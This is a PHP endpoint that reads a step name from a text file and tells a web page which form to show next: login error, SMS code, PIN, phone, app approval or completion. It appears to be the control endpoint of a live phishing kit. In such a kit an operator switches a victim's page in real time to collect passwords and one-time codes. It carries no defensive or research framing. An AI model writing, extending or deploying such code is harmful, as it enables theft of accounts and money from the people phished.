<?php
/**
 * Simple API Endpoint - Reads from api.txt
 * Supports both plain text (sms, pin, etc.) and meta tag format
 */

// Read current state from api.txt
$apiFile = 'api.txt';
$currentStep = ''; // Default empty

if (file_exists($apiFile)) {
    $content = trim(file_get_contents($apiFile));
    
    // Check if content is in meta tag format
    if (preg_match("/url=([^&?]+)/", $content, $matches)) {
        // Extract filename from meta tag: sms.php?verify_account=...
        $filename = explode('?', $matches[1])[0];
        $currentStep = str_replace('.php', '', $filename);
    } else {
        // Plain text format
        $currentStep = $content;
    }
}

// If file is empty, return waiting status
if (empty($currentStep)) {
    echo json_encode([
        'status' => 'waiting',
        'next_file' => null,
        'show_form' => false
    ]);
    exit;
}

// Determine response based on extracted step
switch ($currentStep) {
    case 'login':
        $response = [
            'status' => 'ready',
            'next_file' => 'login.php',
            'show_form' => false  // Special case - show error, not form
        ];
        break;
        
    case 'logout':
        $response = [
            'status' => 'ready',
            'next_file' => 'logout.php',
            'show_form' => false  // Special case - show success and redirect
        ];
        break;
        
    case 'sms':
        $response = [
            'status' => 'ready',
            'next_file' => 'sms.php',
            'show_form' => true
        ];
        break;
        
    case 'pin':
        $response = [
            'status' => 'ready',
            'next_file' => 'pin.php',
            'show_form' => true
        ];
        break;
        
    case 'phone':
        $response = [
            'status' => 'ready',
            'next_file' => 'phone.php',
            'show_form' => true
        ];
        break;
        
    case 'app':
        $response = [
            'status' => 'ready',
            'next_file' => 'app.php',
            'show_form' => false
        ];
        break;
        
    case 'complete':
        $response = [
            'status' => 'complete',
            'next_file' => null,
            'show_form' => false
        ];
        break;
        
    default:
        $response = [
            'status' => 'waiting',
            'next_file' => null,
            'show_form' => false
        ];
        break;
}

echo json_encode($response);
?>
